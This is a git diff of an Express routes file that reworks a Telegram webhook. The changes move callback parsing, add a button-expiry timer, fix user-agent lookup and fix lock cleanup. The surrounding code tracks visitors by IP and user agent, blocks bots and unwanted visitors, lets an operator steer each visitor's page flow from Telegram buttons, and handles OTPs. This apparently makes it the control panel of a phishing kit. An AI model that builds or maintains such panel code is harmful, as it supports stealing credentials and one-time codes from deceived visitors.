@@ -2,13 +2,14 @@ import express from "express";
 import geoip from "geoip-lite";
 import session from "express-session";
 import axios from "axios";
-import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, systemInfo, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
+import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, systemInfo, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow, pendingButtonTimers } from "../utils.js";
 import capRouter, { requireCap } from "../altcheck.js";
 import { addToBlacklist, removeFromBlacklist, } from '../middleware/frontblock.js';
 import dotenv from "dotenv";
 import bcrypt from "bcrypt";
 dotenv.config();
 
+const pendingPrompts = new Map();
 const activeLocks = new Set();
 
 export default function createRoutes(db, io) {
@@ -507,14 +508,9 @@ router.post("/deleteuser", async (req, res) => {
   }
 });
 
+
 router.post("/telegram-webhook", async (req, res) => {
   const data = req.body;
-
-  if (!data.callback_query) return res.sendStatus(200);
-
-  const callback = data.callback_query;
-  const { message } = callback;
-  const [_, command, userId] = callback.data.split(":");
 
   try {
     // ------------------------------------------------
@@ -528,8 +524,17 @@ router.post("/telegram-webhook", async (req, res) => {
 
     const botToken = telegramInfo.BotToken;
 
+    // ============================================================
+    // 1️⃣ HANDLE NORMAL MESSAGE (not callback)
+    // ============================================================
+    if (!data.callback_query) return res.sendStatus(200);
+
+    const callback = data.callback_query;
+    const { message } = callback;
+    const [_, command, userId] = callback.data.split(":");
+
     // ------------------------------------------------
-    // 1️⃣ Stop loading animation
+    // 2️⃣ Stop loading animation
     // ------------------------------------------------
     await axios.post(
       `https://api.telegram.org/bot${botToken}/answerCallbackQuery`,
@@ -537,13 +542,22 @@ router.post("/telegram-webhook", async (req, res) => {
     );
 
     // ------------------------------------------------
-    // 2️⃣ Prevent multiple clicks
+    // 3️⃣ Cancel button expiration timer (if exists)
+    // ------------------------------------------------
+    if (pendingButtonTimers.has(message.chat.id)) {
+	  clearTimeout(pendingButtonTimers.get(message.chat.id));
+	  pendingButtonTimers.delete(message.chat.id);
+	}
+    
+
+    // ------------------------------------------------
+    // 4️⃣ Prevent multiple clicks
     // ------------------------------------------------
     if (activeLocks.has(userId)) return res.sendStatus(200);
     activeLocks.add(userId);
 
     // ------------------------------------------------
-    // 3️⃣ Handle BLOCK / UNBLOCK
+    // 5️⃣ Handle BLOCK / UNBLOCK
     // ------------------------------------------------
     if (command === "block" || command === "unblock") {
       const userRow = await db.get(
@@ -551,20 +565,18 @@ router.post("/telegram-webhook", async (req, res) => {
         [userId]
       );
 
-      
+      let systemInfo = {};
       try {
         systemInfo = JSON.parse(userRow?.system_info || "{}");
       } catch (err) {
         console.warn(`Failed to parse system_info for user ${userId}`);
       }
-      
-      console.log(systemInfo);
 
       if (command === "block") {
         systemInfo.blocked = true;
 
         const ip = userRow?.ip || null;
-        const ua = userRow?.system_info.ua || null;
+        const ua = systemInfo?.ua || null;
 
         await addToBlacklist(ip, ua, userId);
       } else {
@@ -581,7 +593,6 @@ router.post("/telegram-webhook", async (req, res) => {
         `✅ USER ${userId} has been ${systemInfo.blocked ? "blocked" : "unblocked"}`
       );
 
-      // Rebuild keyboard after status change
       const buttons = await buildTelButtons(userId, db);
 
       await axios.post(
@@ -595,7 +606,7 @@ router.post("/telegram-webhook", async (req, res) => {
     }
 
     // ------------------------------------------------
-    // 4️⃣ Handle other commands
+    // 6️⃣ Handle other commands
     // ------------------------------------------------
     else {
       let otp;
@@ -615,7 +626,10 @@ router.post("/telegram-webhook", async (req, res) => {
   } catch (err) {
     console.error("❌ Telegram webhook error:", err);
   } finally {
-    activeLocks.delete(userId);
+    if (data?.callback_query?.data) {
+      const userId = data.callback_query.data.split(":")[2];
+      activeLocks.delete(userId);
+    }
   }
 
   res.sendStatus(200);
